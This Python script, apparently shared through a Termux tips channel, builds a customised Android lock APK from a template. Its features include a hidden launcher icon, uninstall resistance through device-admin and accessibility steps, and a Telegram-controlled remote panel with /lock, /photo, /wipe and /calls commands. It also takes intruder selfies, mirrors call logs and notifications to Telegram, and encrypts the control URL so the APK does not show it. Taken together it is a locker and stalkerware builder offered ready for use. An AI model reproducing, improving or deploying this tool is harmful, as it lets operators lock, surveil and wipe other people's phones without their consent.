#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZYROX LOCK BUILDER v7 — Termux tool
Passwords (offline+online) + lock screen + contact + URL + Telegram remote
+ stealth + panel URL + uninstall-proof -> ready LOCK APK.
Made By KMJ TIPS CHANNEL
"""
import base64
import hashlib
import json
import os
import random
import re
import shutil
import string
import sys
import zipfile
from getpass import getpass

HERE = os.path.dirname(os.path.abspath(__file__))
TEMPLATE = os.path.join(HERE, "template.apk")
VERSION = "v9"  # builder version — har major update pe badhao

C = {"R": "\033[0;31m", "G": "\033[0;32m", "Y": "\033[1;33m",
     "CY": "\033[0;36m", "M": "\033[0;35m", "B": "\033[1m", "N": "\033[0m"}


def banner():
    os.system("clear")
    print(f"{C['CY']}{C['B']}")
    print("  ______  ___  ______  _____  __  __")
    print(" |__  /\\ \\ / /  _ \\\\ \\/ / _ \\\\ \\/ /")
    print("   / /  \\\\ V /| |_) \\\\  / | | \\\\  / ")
    print("  / /_   | | |  _ < / \\\\ |_| /  \\\\ ")
    print(" /____|  |_| |_| \\\\_/_/\\\\_\\\\___/_/\\\\_\\\\")
    print(f"{C['Y']}{C['B']}      LOCK  BUILDER  {VERSION}{C['N']}")
    print(f"{C['B']}   Made By KMJ TIPS CHANNEL{C['N']}\n")


def ask_yn(prompt, default="n"):
    d = "Y/n" if default == "y" else "y/N"
    a = input(f"{C['B']}{prompt} [{d}]: {C['N']}").strip().lower()
    if not a:
        return default == "y"
    return a in ("y", "yes", "h", "han")


def enc_url(url, key_hex):
    """Encrypt panel URL: ENC1:<base64(nonce|ciphertext)>.
    Stream cipher: keystream block i = SHA256(key | nonce | counter_be32).
    App decrypts with the same construction (LockActivity.decUrl)."""
    key = bytes.fromhex(key_hex)
    nonce = os.urandom(8)
    pt = url.encode()
    ks = b""
    ctr = 0
    while len(ks) < len(pt):
        ks += hashlib.sha256(key + nonce + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    ct = bytes(a ^ b for a, b in zip(pt, ks))
    return "ENC1:" + base64.b64encode(nonce + ct).decode()


def patch_secret_code(manifest_bytes, new_code):
    """Binary AXML patch: replace the single '7827' string with the new dialer code."""
    if not re.match(r"^\d{3,8}$", new_code):
        return manifest_bytes, False
    u16_old = "7827".encode("utf-16-le")
    u16_new = new_code.encode("utf-16-le")
    # length must stay identical -> pad/truncate not allowed; only same-length codes
    if len(new_code) != 4:
        print(f"{C['Y']}⚠ Code 4-digit hona chahiye (manifest patch) — default 7827 rakha.{C['N']}")
        return manifest_bytes, False
    if manifest_bytes.count(u16_old) != 1 or manifest_bytes.count(b"7827") != 0:
        print(f"{C['Y']}⚠ Manifest patch skip (string count mismatch) — default 7827 active.{C['N']}")
        return manifest_bytes, False
    return manifest_bytes.replace(u16_old, u16_new), True


def main():
    banner()

    # STEP 1: passwords (two-password model)
    print(f"{C['CY']}{C['B']}--- STEP 1: Passwords (2-password model) ---\n{C['N']}")
    print(f"{C['Y']}🔑 OFFLINE password = builder me set, kabhi remotely change NAHI hota (safe fallback){C['N']}")
    print(f"{C['Y']}🌐 ONLINE password = panel /setpw se remotely change ho sakta hai{C['N']}\n")
    while True:
        off1 = getpass(f"{C['B']}🔑 Offline password: {C['N']}").strip()
        if len(off1) < 4:
            print(f"{C['Y']}⚠ Kam se kam 4 character!{C['N']}")
            continue
        off2 = getpass(f"{C['B']}🔑 Confirm offline: {C['N']}").strip()
        if off1 != off2:
            print(f"{C['R']}❌ Match nahi hua!{C['N']}")
            continue
        break
    on_pw = getpass(f"{C['B']}🌐 Online password [Enter = skip]: {C['N']}").strip()
    if on_pw and len(on_pw) < 4:
        print(f"{C['Y']}⚠ 4 se chhota — online password skip.{C['N']}")
        on_pw = ""

    # STEP 2: lock screen text + image
    print(f"\n{C['CY']}{C['B']}--- STEP 2: Lock Screen Text + Image ---\n{C['N']}")
    text = input(f"{C['B']}📝 Lock text [Phone locked hai]: {C['N']}").strip()
    img_in = input(f"{C['B']}🖼️  Image ka path (Enter = skip): {C['N']}").strip()
    img_path = None
    if img_in:
        img_in = os.path.expanduser(img_in)
        if os.path.isfile(img_in):
            img_path = img_in
            print(f"{C['G']}[✓]{C['N']} Image milegi")
        else:
            print(f"{C['Y']}⚠ File nahi mili — image skip.{C['N']}")

    # STEP 3: contact button
    print(f"\n{C['CY']}{C['B']}--- STEP 3: Contact Button (optional) ---\n{C['N']}")
    cname = input(f"{C['B']}👤 Naam [Enter = skip]: {C['N']}").strip()
    cnum = ""
    if cname:
        cnum = input(f"{C['B']}📞 Number (jaise +911234567890): {C['N']}").strip()

    # STEP 4: URL button
    print(f"\n{C['CY']}{C['B']}--- STEP 4: URL Button (optional) ---\n{C['N']}")
    utext = input(f"{C['B']}🔗 Button text [Enter = skip]: {C['N']}").strip()
    ulink = ""
    if utext:
        ulink = input(f"{C['B']}🌐 URL (https://...): {C['N']}").strip()
        if not re.match(r"^https?://", ulink):
            print(f"{C['Y']}⚠ Sahi URL nahi — skip.{C['N']}")
            utext, ulink = "", ""

    # STEP 5: intruder selfie + Telegram
    print(f"\n{C['CY']}{C['B']}--- STEP 5: Intruder Selfie + Telegram Alerts ---\n{C['N']}")
    intruder = ask_yn("📸 3rd galat password pe front-camera selfie")
    tg_token, tg_chat = "", ""
    if ask_yn("🤖 Telegram alerts chahiye (bot token + chat id)"):
        tg_token = getpass(f"{C['B']}Bot token: {C['N']}").strip()
        tg_chat = input(f"{C['B']}Chat ID: {C['N']}").strip()
        if not (tg_token and tg_chat):
            print(f"{C['Y']}⚠ Dono chahiye — Telegram skip.{C['N']}")
            tg_token, tg_chat = "", ""

    # STEP 6: auto-lock timer
    print(f"\n{C['CY']}{C['B']}--- STEP 6: Auto-Lock Timer ---\n{C['N']}")
    auto_mins = 0
    am = input(f"{C['B']}⏱️  Kitne minute idle pe auto-lock [0 = off]: {C['N']}").strip()
    if am.isdigit():
        auto_mins = int(am)

    # STEP 7: panic password
    print(f"\n{C['CY']}{C['B']}--- STEP 7: Panic Password ---\n{C['N']}")
    print(f"{C['R']}{C['B']}☠️  WARNING: panic password dalne pe PHONE KA DATA WIPE ho jayega!{C['N']}")
    print(f"{C['R']}   Sirf tab ON karo jab tumhe EXACTLY pata ho ye kya karta hai.{C['N']}")
    panic_pw = ""
    if ask_yn("☠️  Panic password ON karna hai"):
        panic_pw = getpass(f"{C['B']}Panic password: {C['N']}").strip()
        if len(panic_pw) < 4:
            print(f"{C['Y']}⚠ 4 se chhota — panic OFF.{C['N']}")
            panic_pw = ""

    # STEP 8: remote Telegram control
    print(f"\n{C['CY']}{C['B']}--- STEP 8: Remote Telegram Control ---\n{C['N']}")
    remote = False
    if tg_token and tg_chat:
        remote = ask_yn("📡 Remote control 24/7 (/lock /unlock /photo /status /setpw /setonlinepw /setofflinepw /settext /setimage /notify /wipe)")
    else:
        print(f"{C['Y']}⚠ Pehle Step 5 me bot lagao — remote skip.{C['N']}")

    # STEP 9: control channel (web panel) — v10: koi secret nahi, sirf channel
    print(f"\n{C['CY']}{C['B']}--- STEP 9: Control Channel (web panel) ---\n{C['N']}")
    ctrl_ch = ""
    if remote:
        ctrl_ch = input(f"{C['B']}📢 Control channel ID (-100... ya @name) [Enter = skip]: {C['N']}").strip()
    cmd_secret = ""  # v10: panel me secret nahi lagta

    # STEP 10: stealth mode
    print(f"\n{C['CY']}{C['B']}--- STEP 10: Stealth Mode ---\n{C['N']}")
    stealth = ask_yn("👻 Launcher icon hide karna hai")
    secret_code = "7827"
    if stealth:
        sc = input(f"{C['B']}📞 Dialer secret code [7827]: {C['N']}").strip()
        if re.match(r"^\d{4}$", sc):
            secret_code = sc
        else:
            print(f"{C['Y']}⚠ 4-digit code chahiye — 7827 rakha.{C['N']}")

    # STEP 11: panel host URL + encryption
    print(f"\n{C['CY']}{C['B']}--- STEP 11: Remote Panel URL (optional) ---\n{C['N']}")
    panel_url = input(f"{C['B']}🌐 Panel URL (https://...) [Enter = skip]: {C['N']}").strip()
    if panel_url and not re.match(r"^https?://", panel_url):
        print(f"{C['Y']}⚠ Sahi URL nahi — skip.{C['N']}")
        panel_url = ""
    panel_key = ""
    panel_stored = panel_url
    if panel_url:
        if ask_yn("🔐 Panel URL pe encryption lagau (APK me plain URL nahi dikhega)"):
            panel_key = os.urandom(16).hex()
            panel_stored = enc_url(panel_url, panel_key)
            print(f"{C['G']}[✓]{C['N']} URL encrypted (ENC1:... format)")

    # STEP 12: panel page password (gate inside index.html)
    print(f"\n{C['CY']}{C['B']}--- STEP 12: Panel Page Password (optional) ---\n{C['N']}")
    print("Panel khulne se pehle ye password mangega (page lock).")
    panel_pw = getpass(f"{C['B']}🔐 Panel password [Enter = skip]: {C['N']}").strip()
    if panel_pw and len(panel_pw) < 4:
        print(f"{C['Y']}⚠ 4 se chhota — panel lock skip.{C['N']}")
        panel_pw = ""

    # STEP 13: call logs + notification mirror (v9)
    print(f"\n{C['CY']}{C['B']}--- STEP 13: Call Logs + Notification Mirror ---\n{C['N']}")
    call_log = ask_yn("📞 Call log access (remote /calls command)", "y")
    notif_mirror = ask_yn("🔔 Notification mirror (phone notifications → Telegram)")

    if not os.path.exists(TEMPLATE):
        print(f"{C['R']}{C['B']}❌ template.apk nahi mila!{C['N']}")
        sys.exit(1)

    print(f"\n{C['M']}{C['B']}[*]{C['N']} APK patch kar raha hun...")
    config = {
        "offline_password": off1,
        "online_password": on_pw,
        "lock_text": text,
        "contact_name": cname,
        "contact_number": cnum,
        "url_text": utext,
        "url_link": ulink,
        "intruder_selfie": intruder,
        "tg_bot_token": tg_token,
        "tg_chat_id": tg_chat,
        "remote_control": remote,
        "auto_lock_minutes": auto_mins,
        "panic_password": panic_pw,
        "panic_enabled": bool(panic_pw),
        "stealth_mode": stealth,
        "secret_code": secret_code,
        "control_channel": ctrl_ch,
        "cmd_secret": cmd_secret,
        "panel_key": panel_key,
        "call_log": call_log,
        "notif_mirror": notif_mirror,
    }
    out = os.path.join(os.getcwd(), "ZYROX-LOCK.apk")
    tmp = out + ".tmp"
    # v7 BUGFIX: duplicate zip entries kabhi nahi — Android hamesha FIRST
    # central-directory entry padhta hai, isliye append-mode writestr se
    # purani entry pehle reh jati aur naya patch silently ignore ho jata tha.
    # Ab: replacements dict me naya content, copy loop me skip, end me ek-ek baar write.
    replacements = {
        "assets/zyrox_lock.json": json.dumps(config).encode(),
        "res/raw/panel_url.txt": (panel_stored.encode() if panel_stored
                                  else b"https://example.com/panel"),
    }
    zin = zipfile.ZipFile(TEMPLATE, "r")
    zout = zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED)
    for item in zin.infolist():
        name = item.filename
        if name in replacements:
            continue  # neeche ek baar likhenge — zero duplicates
        data = zin.read(name)
        if name == "AndroidManifest.xml" and stealth and secret_code != "7827":
            data, ok = patch_secret_code(data, secret_code)
            if ok:
                print(f"{C['G']}[✓]{C['N']} Secret dialer code: *#*#{secret_code}#*#*")
        zout.writestr(item, data)
    zin.close()
    if img_path:
        with open(img_path, "rb") as f:
            replacements["assets/lock_image.png"] = f.read()
        print(f"{C['G']}[✓]{C['N']} Lock image add hui")
    for name, data in replacements.items():
        zout.writestr(name, data)
    zout.close()
    # safety: har naam exactly ek baar hona chahiye
    chk = zipfile.ZipFile(tmp, "r")
    names = chk.namelist()
    dupes = sorted({n for n in names if names.count(n) > 1})
    chk.close()
    if dupes:
        print(f"{C['R']}[✗]{C['N']} Duplicate entries mili: {dupes} — build roka!")
        os.remove(tmp)
        sys.exit(1)
    os.replace(tmp, out)
    if panel_url:
        print(f"{C['G']}[✓]{C['N']} Panel URL set"
              + (" (encrypted)" if panel_key else " (plain)"))
    print(f"{C['G']}{C['B']}[✓]{C['N']} APK ban gaya: {out}")

    # index.html ready-to-host (panel-template.html + password hash injection)
    try:
        tpl = os.path.join(HERE, "panel-template.html")
        if os.path.isfile(tpl):
            html = open(tpl, encoding="utf-8").read()
            if panel_pw:
                h = hashlib.sha256(panel_pw.encode()).hexdigest()
                html = html.replace("__PANEL_PW_HASH__", h)
                print(f"{C['G']}[✓]{C['N']} Panel page lock ON (password gate)")
            else:
                print(f"{C['Y']}[i]{C['N']} Panel page lock OFF — koi bhi link khol sakta hai")
            open(os.path.join(os.getcwd(), "index.html"), "w", encoding="utf-8").write(html)
            print(f"{C['G']}[✓]{C['N']} index.html ready — ise host karo!")
    except Exception as e:
        print(f"{C['Y']}⚠ index.html nahi ban paya: {e}{C['N']}")

    # v9: output folder — SD card pe (file manager/MT Manager me aasaani se mile)
    # termux-setup-storage ke baad /sdcard writable hota hai; nahi to cwd fallback
    sd = "/sdcard"
    base = sd if (os.path.isdir(sd) and os.access(sd, os.W_OK)) else os.getcwd()
    if base == os.getcwd():
        print(f"{C['Y']}[i]{C['N']} /sdcard nahi mila — pehle {C['B']}termux-setup-storage{C['N']} chalao")
    outdir = os.path.join(base, f"ZYROX-LOCK-{VERSION}")
    try:
        os.makedirs(outdir, exist_ok=True)
        shutil.copy2(out, os.path.join(outdir, "ZYROX-LOCK.apk"))
        idx = os.path.join(os.getcwd(), "index.html")
        if os.path.isfile(idx):
            shutil.copy2(idx, os.path.join(outdir, "index.html"))
        print(f"{C['G']}[✓]{C['N']} 📁 Output folder: {outdir}")
        print(f"{C['G']}[✓]{C['N']} 📁 me copy hua: ZYROX-LOCK.apk + index.html")
    except Exception as e:
        print(f"{C['Y']}⚠ Folder copy nahi hua: {e} — APK yahin hai: {out}{C['N']}")

    # v10: panel me koi secret nahi lagta — sirf token + channel ID dalo panel me
    print(f"{C['G']}[✓]{C['N']} Web panel ready — sirf {C['B']}Bot Token + Channel ID{C['N']} dalo, koi secret nahi!\n")

    print(f"{C['Y']}{C['B']}--- LAST STEPS (app me hi honge) ---\n{C['N']}"
          f"📁 APK + panel is folder me hain: {C['B']}ZYROX-LOCK-{VERSION}/{C['N']}\n"
          f"1. {C['B']}MT Manager{C['N']} me ZYROX-LOCK.apk ko {C['B']}sign{C['N']} karo\n"
          "2. Install karo, kholo — app khud puchega:\n"
          f"   Step 1: {C['B']}🛡️ ENABLE ADMIN{C['N']} dabao → Activate karo\n"
          f"   Step 2: {C['B']}👁️ ENABLE GUARD{C['N']} dabao → ZYROX LOCK ko ON karo\n"
          f"   Step 3: {C['B']}🔔 Notification Access{C['N']} (sirf mirror ON ho to) → ON karo ya SKIP\n"
          f"   Step 4: {C['B']}📞 Call Log Access{C['N']} (sirf /calls chahiye to) → ALLOW ya SKIP\n"
          "3. 🔐 Offline/Online password me se koi ek dalo → phone unlock! ✅\n"
          "4. Reboot pe auto-lock lagega 🔒\n")
    print(f"{C['G']}{C['B']}======================================{C['N']}")
    print(f"{C['G']}{C['B']}  ✅ ZYROX LOCK {VERSION} APK READY!{C['N']}")
    print(f"{C['G']}{C['B']}======================================{C['N']}")
    print(f"\n{C['B']}  Made By KMJ TIPS CHANNEL 💛{C['N']}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C['Y']}👋 Bye!{C['N']}")
